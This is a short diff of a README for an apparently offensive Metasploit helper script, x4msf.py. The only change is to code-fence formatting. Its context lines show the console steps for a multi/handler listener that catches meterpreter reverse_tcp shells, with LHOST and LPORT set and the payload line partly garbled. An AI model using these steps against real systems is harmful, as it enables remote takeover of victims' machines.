@@ -27,13 +27,14 @@ $ python x4msf.py
 ```
 
 # Exploit
-	```bash
+	```
 	>> msfconsole
 	msf> use exploit/multi/handler
 	msf> (os)/meterpreter/reverse_tcp
 	msf> set LHOST > Your LHOST
 	msf> set LPORT > Your LPORT
 	msf> run
+```
 # author :
 * 1. Rakib Hossain
 
